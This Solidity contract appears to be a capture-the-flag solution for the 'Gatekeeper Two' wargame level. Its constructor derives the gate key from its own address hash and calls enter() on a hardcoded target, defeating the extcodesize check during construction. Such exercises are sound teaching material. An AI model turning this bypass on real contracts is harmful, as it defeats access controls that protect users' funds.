// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MyGatekeeperTwo {

  address public entrant;


  constructor() public{
    bytes8 _jma = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);

    address his = 0xBF733cadCa38fAA71Dfa29D903EB1f8Bd8F49541;
    his.call(abi.encodeWithSignature("enter(bytes8)", _jma));
  }
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

    function getextcodesize() public view returns(uint) {
    uint x;
    assembly { x := extcodesize(address()) }
    return(x );
    
  }

  function getAllGateThree(bytes8 _gateKey) public view returns(uint64, uint64, bytes8, uint64, uint64, bool) {
    return (uint64(bytes8(keccak256(abi.encodePacked(address(this))))), uint64(_gateKey), bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1), uint64(0) - 1, uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1, uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey) == uint64(0) - 1);
    
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}